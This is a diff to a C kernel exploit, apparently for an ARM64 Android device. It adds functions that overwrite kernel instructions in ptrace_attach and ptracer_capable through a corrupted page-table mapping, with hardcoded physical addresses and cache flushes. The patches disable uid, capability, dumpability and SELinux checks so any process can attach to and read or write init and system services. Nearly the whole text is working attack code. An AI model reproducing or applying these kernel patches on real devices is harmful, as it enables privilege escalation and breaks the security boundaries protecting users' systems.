@@ -194,6 +194,22 @@ static void flush_tlb(void) {
 #define INIT_TASK_PA          0x41f4d2c0UL
 #define DEFEX_ENFORCE_PA      0x40270330UL
 #define PTRACE_MAY_ACCESS_PA  0x40183874UL
+/* Inside ptrace_attach, after the alloc_lock is taken, a `b.ne` skips
+   the entire same-thread-group early-out and falls into the inlined
+   __ptrace_may_access body. NOP'ing it sends every attach request
+   straight to LAB_d144, bypassing the inlined uid/cap/dumpable checks
+   AND security_ptrace_access_check. PTRACE_ATTACH from gdb succeeds
+   regardless of caller domain, target uid, or SELinux policy. */
+#define PTRACE_ATTACH_BNE_PA  0x4041d138UL
+/* PEEK/POKE through ptrace_access_vm have a separate gate that fails
+   for non-dumpable targets (init, system services) unless our stored
+   ptracer_cred has CAP_SYS_PTRACE in the target's user_ns. Patching
+   ptracer_capable to always return true bypasses that branch — gdb
+   memory reads/writes against init etc. start working. Not needed for
+   targets that are dumpable (regular apps), nor for the
+   process_vm_readv/writev path (which uses mm_access → ptrace_may_access
+   instead, already neutered). */
+#define PTRACER_CAPABLE_PA    0x4104eeb0UL
 #define TS_TASKS_OFF          0x550
 #define TS_PID_OFF            0x618
 #define TS_PARENT_OFF         0x630
@@ -211,6 +227,7 @@ static void flush_tlb(void) {
 #define INSN_MOV_W0_0         0x52800000U
 #define INSN_MOV_W0_1         0x52800020U
 #define INSN_RET              0xd65f03c0U
+#define INSN_NOP              0xd503201fU
 
 static volatile uint8_t *KMAP;        /* set to glitched_map before any kread/kwrite */
 static uint64_t          KORIG_PTE;   /* attribute bits of glitched_pte */
@@ -297,6 +314,62 @@ static void patch_ptrace_may_access(void) {
     __asm__ volatile("dsb ish; isb" ::: "memory");
 }
 
+/* Inside ptrace_attach, the inlined __ptrace_may_access body is
+   guarded by an early-out: if task->signal == current->signal (i.e.
+   we're attaching to one of our own threads), the access check is
+   skipped entirely. NOP'ing the conditional branch that selects the
+   "else" path forces every attach down that same-thread-group success
+   route, regardless of caller domain or target uid. Single 4-byte
+   patch — only ptrace_may_access alone isn't enough because
+   ptrace_attach has its own copy of the inlined check. */
+static void patch_ptrace_attach_bne(void) {
+    p_str("[*] patching ptrace_attach b.ne -> nop\n");
+    uint64_t pa      = PTRACE_ATTACH_BNE_PA;
+    uint64_t page_pa = pa & ~0xfffUL;
+    size_t   off     = pa & 0xfff;
+
+    kpoint(page_pa);
+    *(volatile uint32_t *)(KMAP + off) = INSN_NOP;
+    __asm__ volatile("dsb ish" ::: "memory");
+
+    uintptr_t va_start = (uintptr_t)(KMAP + off);
+    uintptr_t va_end   = va_start + 4;
+    uintptr_t line     = va_start & ~63UL;
+    for (uintptr_t a = line; a < va_end; a += 64)
+        __asm__ volatile("dc cvau, %0" :: "r"(a) : "memory");
+    __asm__ volatile("dsb ish" ::: "memory");
+    for (uintptr_t a = line; a < va_end; a += 64)
+        __asm__ volatile("ic ivau, %0" :: "r"(a) : "memory");
+    __asm__ volatile("dsb ish; isb" ::: "memory");
+}
+
+/* ptrace_access_vm (the PEEK/POKE memory-access helper) has its own
+   gate independent of ptrace_may_access: for non-dumpable targets it
+   requires the stored ptracer_cred to have CAP_SYS_PTRACE in the
+   target's user_ns. ptracer_capable returns bool — same patch shape as
+   patch_ptrace_may_access. */
+static void patch_ptracer_capable(void) {
+    p_str("[*] patching ptracer_capable -> mov w0, #1 ; ret\n");
+    uint64_t pa      = PTRACER_CAPABLE_PA;
+    uint64_t page_pa = pa & ~0xfffUL;
+    size_t   off     = pa & 0xfff;
+
+    kpoint(page_pa);
+    *(volatile uint32_t *)(KMAP + off + 0) = INSN_MOV_W0_1;
+    *(volatile uint32_t *)(KMAP + off + 4) = INSN_RET;
+    __asm__ volatile("dsb ish" ::: "memory");
+
+    uintptr_t va_start = (uintptr_t)(KMAP + off);
+    uintptr_t va_end   = va_start + 8;
+    uintptr_t line     = va_start & ~63UL;
+    for (uintptr_t a = line; a < va_end; a += 64)
+        __asm__ volatile("dc cvau, %0" :: "r"(a) : "memory");
+    __asm__ volatile("dsb ish" ::: "memory");
+    for (uintptr_t a = line; a < va_end; a += 64)
+        __asm__ volatile("ic ivau, %0" :: "r"(a) : "memory");
+    __asm__ volatile("dsb ish; isb" ::: "memory");
+}
+
 /* Block forever via nanosleep so the patch stays installed and the
    exploit process is still around to be inspected. Loop in case
    nanosleep returns early on a signal. Inlined raw svc to avoid pulling
@@ -321,6 +394,8 @@ static void do_ptrace_patch_only(uint64_t orig_pte, uint8_t *glitched_map) {
     KORIG_PTE = orig_pte;
 
     patch_ptrace_may_access();
+    patch_ptrace_attach_bne();
+    patch_ptracer_capable();
 
     /* restore the original PTE — the glitched mapping is no longer needed. */
     *glitched_pte = orig_pte;
